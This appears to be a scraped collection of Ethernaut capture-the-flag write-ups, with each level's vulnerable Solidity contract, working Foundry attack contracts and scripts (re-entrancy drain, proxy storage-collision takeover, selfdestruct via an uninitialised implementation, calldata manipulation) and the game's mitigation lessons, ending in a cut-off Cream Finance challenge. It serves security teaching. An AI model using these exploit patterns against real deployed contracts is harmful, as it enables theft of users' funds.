_IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; struct AddressSlot { address value; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor(address _logic) public { require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\"); _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic; (bool success,) = _logic.delegatecall( abi.encodeWithSignature(\"initialize()\") ); require(success, \"Call failed\"); } // Delegates the current call to `implementation`. function _delegate(address implementation) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) { assembly { r_slot := slot } } } contract Engine is Initializable { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; address public upgrader; uint256 public horsePower; struct AddressSlot { address value; } function initialize() external initializer { horsePower = 1000; upgrader = msg.sender; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall(address newImplementation, bytes memory data) external payable { _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data); } // Restrict to upgrader role function _authorizeUpgrade() internal view { require(msg.sender == upgrader, \"Can't upgrade\"); } // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall( address newImplementation, bytes memory data ) internal { // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length \u003e 0) { (bool success,) = newImplementation.delegatecall(data); require(success, \"Call failed\"); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation(address newImplementation) private { require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\"); AddressSlot storage r; assembly { r_slot := _IMPLEMENTATION_SLOT } r.value = newImplementation; } } ‚ö†Ô∏è This lvl is broken since Dencun fork has already been applied to Sepolia testnet ‚ö†Ô∏è\nSolution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,Motorbike} from '../src/25.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_25\"); // \u003c== I use the engine's address here not the one from the proxy vm.startBroadcast(deployerPrivateKey); Motorbike motorbike = Motorbike(addr); Attacker attacker = new Attacker(); attacker.attack(motorbike); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0; import \"../lib/forge-std/src/console.sol\"; interface Motorbike { function upgrader() external returns(address); function horsePower() external returns(address); function upgradeToAndCall(address newImplementation, bytes memory data) external payable; function initialize() external; } contract Attacker { address payable owner; constructor() { owner = payable(msg.sender); } function innocence() public { selfdestruct(owner); } function attack(Motorbike motorbike) public payable { motorbike.initialize(); bytes memory innocenceCall = abi.encodeWithSignature(\"innocence()\"); motorbike.upgradeToAndCall(address(this), innocenceCall); } } "},"title":"Motorbike"},"/projects/ethernaut/naught-coin-5013cfef45d646e693a6feaac127ac33/":{"data":{"":" NaughtCoin is an ERC20 token and you‚Äôre already holding all of them. The catch is that you‚Äôll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\nThings that might help\nThe ERC20 Spec The OpenZeppelin codebase // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = block.timestamp + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(block.timestamp \u003e timeLock); _; } else { _; } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,NaughtCoin} from \"../src/15.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address publicKey = vm.envAddress(\"PUBLIC_KEY\"); address addr = vm.envAddress(\"INSTANCE_15\"); vm.startBroadcast(deployerPrivateKey); Attacker attacker = new Attacker(); NaughtCoin nc = NaughtCoin(addr); nc.approve(address(attacker), nc.balanceOf(publicKey)); attacker.attack(address(nc)); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface NaughtCoin { function transfer(address _to, uint256 _value) external returns(bool); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool); function balanceOf(address account) external view returns (uint256); } contract Attacker { function attack(address _addr) public { NaughtCoin nc = NaughtCoin(_addr); nc.transferFrom(msg.sender, address(this), nc.balanceOf(msg.sender)); } } When using code that‚Äôs not your own, it‚Äôs a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you‚Äôre allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation."},"title":"Naught Coin"},"/projects/ethernaut/preservation-15486d553b7048eba93be9c33dcdd447/":{"data":{"":" This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.\nThe goal of this level is for you to claim ownership of the instance you are given.\nThings that might help\nLook into Solidity‚Äôs documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope. Understanding what it means for delegatecall to be context-preserving. Understanding how storage variables are stored and accessed. Understanding how casting works between different data types. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Preservation { // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) { timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; } // set the time for timezone 1 function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } // set the time for timezone 2 function setSecondTime(uint _timeStamp) public { timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime; function setTime(uint _time) public { storedTime = _time; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,Preservation} from \"../src/16.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_16\"); address pubKey = vm.envAddress(\"PUBLIC_KEY\"); vm.startBroadcast(deployerPrivateKey); Attacker attacker = new Attacker(); attacker.attack(addr, pubKey); console.logAddress(Preservation(addr).owner()); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Preservation { function timeZone1Library() external returns(address); function setFirstTime(uint _timeStamp) external; function owner() external returns(address); } contract Attacker { // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); function attack(address _preservation, address newOwner) public { Preservation preservation = Preservation(_preservation); preservation.setFirstTime(uint160(address(this))); preservation.setFirstTime(uint160(address(newOwner))); } function setTime(uint _time) public { owner = address(uint160(_time)); } } As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables."},"title":"Preservation"},"/projects/ethernaut/privacy-0141c59931824d74a8311099eb338d5d/":{"data":{"":" title: Privacy weight: 13 type: docs prev: elevator next: gatekeeper-one\nLevel12 - ‚≠ê‚≠ê‚≠ê\nThe creator of this contract was careful enough to protect the sensitive areas of its storage.\nUnlock this contract to beat the level.\nThings that might help:\nUnderstanding how storage works Understanding how parameter parsing works Understanding how casting works Tips:\nRemember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Privacy { bool public locked = true; // slot 0 uint256 public ID = block.timestamp; // slot 1 uint8 private flattening = 10; // slot 2 uint8 private denomination = 255; // slot 2 uint16 private awkwardness = uint16(block.timestamp); // slot 2 bytes32[3] private data; // [slot3, slot4, slot5] constructor(bytes32[3] memory _data) { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } for more details on storage layout read this article:\nbookmark\nSo, the _key is stored at slot 5 since it is data[2]:\n‚ûú ~/repos/ethernaut (main) cast storage --rpc-url $SEPOLIA_RPC_URL $INSTANCE_12 5 0xe32410e9fbc1f17b0f1d9a6ed141317f11c4b2a5d38981dfa025aacf8b708d7d Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Privacy} from \"../src/12.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_12\"); vm.startBroadcast(deployerPrivateKey); Privacy privacy = Privacy(addr); console.log('isLocked : %s', privacy.locked()); // vm.load() allows us to read arbitrary storage slot bytes16 key = bytes16(vm.load(address(privacy), bytes32(uint(5)))); privacy.unlock(key); console.log('isLocked : %s', privacy.locked()); vm.stopBroadcast(); } } Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3‚Äôs getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.\nIt can‚Äôt get much more complicated than what was exposed in this level. For more, check out this excellent article by ‚ÄúDarius‚Äù: How to read Ethereum contract storage\nMore info:\nbookmark"},"title":"Privacy"},"/projects/ethernaut/puzzle-wallet-45b8e0a7c4784a4b952672eecda0daa6/":{"data":{"":" Nowadays, paying for DeFi operations is impossible, fact.\nA group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.\nThey needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.\nLittle did they know, their lunch money was at risk‚Ä¶\nYou‚Äôll need to hijack this wallet to become the admin of the proxy.\nThings that might help:\nUnderstanding how delegatecall works and how msg.sender and msg.value behaves when performing one. Knowing about proxy patterns and the way they handle storage variables. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; pragma experimental ABIEncoderV2; import \"../helpers/UpgradeableProxy-08.sol\"; contract PuzzleProxy is UpgradeableProxy { address public pendingAdmin; address public admin; constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) { admin = _admin; } modifier onlyAdmin { require(msg.sender == admin, \"Caller is not the admin\"); _; } function proposeNewAdmin(address _newAdmin) external { pendingAdmin = _newAdmin; } function approveNewAdmin(address _expectedAdmin) external onlyAdmin { require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\"); admin = pendingAdmin; } function upgradeTo(address _newImplementation) external onlyAdmin { _upgradeTo(_newImplementation); } } contract PuzzleWallet { address public owner; uint256 public maxBalance; mapping(address =\u003e bool) public whitelisted; mapping(address =\u003e uint256) public balances; function init(uint256 _maxBalance) public { require(maxBalance == 0, \"Already initialized\"); maxBalance = _maxBalance; owner = msg.sender; } modifier onlyWhitelisted { require(whitelisted[msg.sender], \"Not whitelisted\"); _; } function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { require(address(this).balance == 0, \"Contract balance is not 0\"); maxBalance = _maxBalance; } function addToWhitelist(address addr) external { require(msg.sender == owner, \"Not the owner\"); whitelisted[addr] = true; } function deposit() external payable onlyWhitelisted { require(address(this).balance \u003c= maxBalance, \"Max balance reached\"); balances[msg.sender] += msg.value; } function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted { require(balances[msg.sender] \u003e= value, \"Insufficient balance\"); balances[msg.sender] -= value; (bool success, ) = to.call{ value: value }(data); require(success, \"Execution failed\"); } function multicall(bytes[] calldata data) external payable onlyWhitelisted { bool depositCalled = false; for (uint256 i = 0; i \u003c data.length; i++) { bytes memory _data = data[i]; bytes4 selector; assembly { selector := mload(add(_data, 32)) } if (selector == this.deposit.selector) { require(!depositCalled, \"Deposit can only be called once\"); // Protect against reusing msg.value depositCalled = true; } (bool success, ) = address(this).delegatecall(data[i]); require(success, \"Error while delegating call\"); } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"../lib/forge-std/src/console.sol\"; interface PuzzleProxy { function init(uint256 _maxBalance) external; function owner() external returns(address); function pendingAdmin() external returns(address); function maxBalance() external returns(uint); function setMaxBalance(uint) external; function admin() external returns(address); function proposeNewAdmin(address _newAdmin) external; function approveNewAdmin(address _expectedAdmin) external; function multicall(bytes[] calldata data) external payable; function deposit() external payable; function addToWhitelist(address addr) external; function execute(address to, uint256 value, bytes calldata data) external payable; function balances(address) external returns(uint); function implementation() external returns (address); } contract Attacker { function attack(PuzzleProxy _proxy) public payable { // [slot0] PuzzleWallet: owner =\u003e PuzzleProxy: pendingAdmin // This mean that owner is now the address of the attacker proxy.proposeNewAdmin(address(this)); proxy.addToWhitelist(address(this)); bytes memory deposit = abi.encodeCall(PuzzleProxy.deposit, ()); // We can call multicall inside multicall to bypass the depositCalled flag // It's like some sort of re-entrancy variant attack bytes[] memory datas = new bytes[](1); datas[0] = deposit; bytes memory multicall = abi.encodeCall(PuzzleProxy.multicall, (datas)); bytes[] memory selectors = new bytes[](2); selectors[1] = multicall; // One deposit call nested iside a multicall selectors[0] = deposit; // The second deposit call // So we deposit once but we can increase our balance twice ! proxy.multicall{ value: msg.value }(selectors); // Then we can withdraw all funds to our address proxy.execute(msg.sender, address(_proxy).balance, \"\"); // Then we can overwrite the maxBalance slot which map to the admin slot // inside the proxy contract :) proxy.setMaxBalance(uint160(address(msg.sender))); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,PuzzleProxy} from '../src/24.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_24\"); vm.startBroadcast(deployerPrivateKey); Attacker attacker = new Attacker(); PuzzleProxy proxy = PuzzleProxy(addr); console.logAddress(proxy.admin()); attacker.attack{ value: address(proxy).balance }(proxy); console.logAddress(proxy.admin()); vm.stopBroadcast(); } } Next time, those friends will request an audit before depositing any money on a contract. Congrats!\nFrequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment‚Äôs gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.\nFurthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.\nMove on to the next level when you‚Äôre ready!"},"title":"Puzzle Wallet"},"/projects/ethernaut/re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d/":{"data":{"":"","#":" The goal of this level is for you to steal all the funds from the contract.\nThings that might help:\nUntrusted contracts can execute code where you least expect it. Fallback methods Throw/revert bubbling Sometimes the best way to attack a contract is with another contract. See the \"?\" page above, section ‚ÄúBeyond the console‚Äù // SPDX-License-Identifier: MIT pragma solidity ^0.6.12; import 'openzeppelin-contracts-06/math/SafeMath.sol'; contract Reentrance { using SafeMath for uint256; mapping(address =\u003e uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] \u003e= _amount) { (bool result,) = msg.sender.call{value:_amount}(\"\"); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {} } üí° In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.\ntransfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.\nAlways assume that the receiver of the funds you are sending can be\nanother contract, not just a regular address. Hence, it can execute code\nin its payable fallback method and re-enter your contract, possibly messing up your state/logic.\nRe-entrancy is a common attack. You should always be prepared for it!\nThe DAO Hack The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.\nUse the Checks-Effects-Interactions PatternÔÉÅ Most functions will first perform some checks and they should be done first (who called the function, are the arguments in range, did they send enough Ether, does the person have tokens, etc.).\nAs the second step, if all checks passed, effects to the state variables of the current contract should be made. Interaction with other contracts should be the very last step in any function.\nEarly contracts delayed some effects and waited for external function calls to return in a non-error state. This is often a serious mistake because of the reentrancy problem explained above.\nNote that, also, calls to known contracts might in turn cause calls to unknown contracts, so it is probably better to just always apply this pattern.\nSolution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker} from \"../src/10.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_10\"); vm.startBroadcast(deployerPrivateKey); console.logUint(address(addr).balance); Attacker instance = new Attacker(payable(addr)); instance.attack{value: address(addr).balance}(); console.logUint(address(addr).balance); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Reentrance { function donate(address _to) external payable; function balanceOf(address _who) external view returns (uint balance); function withdraw(uint _amount) external; receive() external payable; } contract Attacker { Reentrance callee; constructor(address payable _callee) { callee = Reentrance(_callee); } function attack() public payable { uint amount = address(callee).balance; callee.donate{value: amount}(address(this)); callee.withdraw(amount); } receive() external payable { uint amount = address(callee).balance; // This check is made to prevent infinite loop if (amount != 0) { callee.withdraw(amount); } } } "},"title":"Re-entrancy"},"/projects/ethernaut/recovery-1efddca3f4ed4053a79cb06c27873d49/":{"data":{"":" A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.\nThis level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.sender, _initialSupply); } } contract SimpleToken { string public name; mapping (address =\u003e uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) { name = _name; balances[_creator] = _initialSupply; } // collect ether in return for tokens receive() external payable { balances[msg.sender] = msg.value * 10; } // allow transfers of tokens function transfer(address _to, uint _amount) public { require(balances[msg.sender] \u003e= _amount); balances[msg.sender] = balances[msg.sender] - _amount; balances[_to] = _amount; } // clean up after ourselves function destroy(address payable _to) public { selfdestruct(_to); } } Solution:\nHere the INSTANCE_17 address is not the level instance but the token address (you can get it looking at an blockchain explorer)\nAn other method would have been to calculate the contract address by hands but this is cumbersome here‚Ä¶\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface SimpleToken { function destroy(address payable _to) external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_17\"); address pubKey = vm.envAddress(\"PUBLIC_KEY\"); vm.startBroadcast(deployerPrivateKey); SimpleToken simpleToken = SimpleToken(addr); console.logUint(addr.balance); simpleToken.destroy(payable(pubKey)); console.logUint(addr.balance); vm.stopBroadcast(); } } "},"title":"Recovery"},"/projects/ethernaut/shop-b6f28652a23642f2805fd50f577ea02f/":{"data":{"":"","#":" –°an you get the item from the shop for less than the price asked?\nThings that might help: Shop expects to be used from a Buyer Understanding restrictions of view functions // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Buyer { function price() external view returns (uint); } contract Shop { uint public price = 100; bool public isSold; function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price() \u003e= price \u0026\u0026 !isSold) { isSold = true; price = _buyer.price(); } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Buyer, Shop} from '../src/21.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_21\"); vm.startBroadcast(deployerPrivateKey); Buyer buyer = new Buyer(addr); buyer.buy(); Shop shop = Shop(addr); console.logBool(shop.isSold()); console.logUint(shop.price()); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Shop { function isSold() external view returns(bool); function price() external view returns(uint); function buy() external; } contract Buyer { Shop shop; constructor(address _shop) { shop = Shop(_shop); } function price() public view returns (uint p) { if (shop.isSold() == true) { return 0; } return 100; } function buy() public { shop.buy(); } } Contracts can manipulate data seen by other contracts in any way they want.\nIt‚Äôs unsafe to change the state based on external and untrusted contracts logic."},"title":"Shop"},"/projects/ethernaut/switch-5a3e05038dd147309496128b2ad2bd09/":{"data":{"":"","#":" Just have to flip the switch. Can‚Äôt be that hard, right?\nThings that might help: Understanding how CALLDATA is encoded.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Switch { bool public switchOn; // switch is off bytes4 public offSelector = bytes4(keccak256(\"turnSwitchOff()\")); modifier onlyThis() { require(msg.sender == address(this), \"Only the contract can call this\"); _; } modifier onlyOff() { // we use a complex data type to put in memory bytes32[1] memory selector; // check that the calldata at position 68 (location of _data) assembly { calldatacopy(selector, 68, 4) // grab function selector from calldata } require( selector[0] == offSelector, \"Can only call the turnOffSwitch function\" ); _; } function flipSwitch(bytes memory _data) public onlyOff { (bool success, ) = address(this).call(_data); require(success, \"call failed :(\"); } function turnSwitchOn() public onlyThis { switchOn = true; } function turnSwitchOff() public onlyThis { switchOn = false; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Switch} from '../src/29.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_29\"); vm.startBroadcast(deployerPrivateKey); Switch s = Switch(addr); console.log('switchOn : %s', s.switchOn()); // Default // 30c13ade // 0000000000000000000000000000000000000000000000000000000000000020 0 // point to 20 // 0000000000000000000000000000000000000000000000000000000000000004 20 // 20606e1500000000000000000000000000000000000000000000000000000000 40 // Hacked // 30c13ade // 0000000000000000000000000000000000000000000000000000000000000060 0 // point to 60 // 0000000000000000000000000000000000000000000000000000000000000004 20 // 20606e1500000000000000000000000000000000000000000000000000000000 40 // skipped // 0000000000000000000000000000000000000000000000000000000000000004 60 // 76227e1200000000000000000000000000000000000000000000000000000000 80 // actually called bytes memory payload = hex\"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000\"; (bool success,) = address(s).call(payload); require(success); console.log('switchOn : %s', s.switchOn()); vm.stopBroadcast(); } } larz et nadia remi romain"},"title":"Switch"},"/projects/ethernaut/telephone-8b2069f0beb045b69400a28665c1d56c/":{"data":{"":" Claim ownership of the contract below to complete this level.\nThings that might help\nSee the \"?\" page above, section ‚ÄúBeyond the console‚Äù // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Telephone { address public owner; constructor() { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } This is one is pretty straight forward, here is the attacker contract we can deploy:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Telephone { function changeOwner(address _owner) external; } contract CoinFlipAttack { Telephone telephone; constructor(address target) { telephone = Telephone(target); } function attack() public { telephone.changeOwner(msg.sender); } } While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.\nAn example of a possible attack is outlined below.\nUse tx.origin to determine whose tokens to transfer, e.g. function transfer(address _to, uint _value) { tokens[tx.origin] -= _value; tokens[_to] += _value; } Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g. function () payable { token.transfer(attackerAddress, 10000); } In this scenario, tx.origin will be the victim‚Äôs address (while msg.sender will be the malicious contract‚Äôs address), resulting in the funds being transferred from the victim to the attacker. "},"title":"Telephone"},"/projects/ethernaut/token-4a8cb8765f8c412190f2db4a7989f9b5/":{"data":{"":" // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface Token { function transfer(address _to, uint _value) external returns (bool); function balanceOf(address _owner) external view returns (uint balance); } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_05\"); address publicKey = vm.envAddress(\"PUBLIC_KEY\"); vm.startBroadcast(deployerPrivateKey); Token token = Token(addr); uint balance = token.balanceOf(publicKey); console.logUint(balance); token.transfer(address(0), balance + 1); balance = token.balanceOf(publicKey); console.logUint(balance); vm.stopBroadcast(); } } The goal of this level is for you to hack the basic token contract below.\nYou are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.\nThings that might help:\nWhat is an odometer? Overflows are very common in solidity and must be checked for with control statements such as:\nif(a + c \u003e a) { a = a + c; } An easier alternative is to use OpenZeppelin‚Äôs SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:\na = a.add(c); If there is an overflow, the code will revert."},"title":"Token"},"/projects/ethernaut/vault-d8ba3eafb273440f9a492b042e65f214/":{"data":{"":" // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } Unlock the vault to pass the level!\nüí° It‚Äôs important to remember that marking a variable as private only prevents\nother contracts from accessing it. State variables marked as private and\nlocal variables are still publicly accessible.\nTo ensure that data is private, it needs to be encrypted before being\nput onto the blockchain. In this scenario, the decryption key should\nnever be sent on-chain, as it will then be visible to anyone who looks\nfor it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter."},"title":"Vault"},"/projects/node-guardians/":{"data":{"":"","#":" Node Guardians is a platform for builders, thinkers, and stakers. Their mission is to bolster innovative and promising crypto ecosystems, and contribute to the future of a decentralized internet. They do this through education and infrastructure. You can see my profile here ‚öîÔ∏è Price Oracle Attack Wintermute Rekt Cream Finance Rekt Poly Network Rekt "},"title":"Node Guardians"},"/projects/node-guardians/-61a4943358404673845deaa0e7258853/":{"data":{"":" "},"title":"_index"},"/projects/node-guardians/cream-finance-rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d/":{"data":{"":" Rekt article: https://rekt.news/cream-rekt/\nThe goal of this challenge is to seize all of the $SEAGOLD supply from SharkVault.\nFrom the subject, we can understand that we are able to request for overcollateralized loan to the shark vault.\nWe can then repay the loan in the opposite direction and withdraw our collateral - fees.\nFinally, their is a liquidation mecanism if the position become undercollateralized.\nFirst thing first, I want to have a look at the current state of the vault contract, here is a simple script to logs the current balances of Gold and Seagold of the Sharkvault:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attack} from \"../src/Attack.sol\"; import {SharkVault, IERC20} from \"../src/Attack.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); 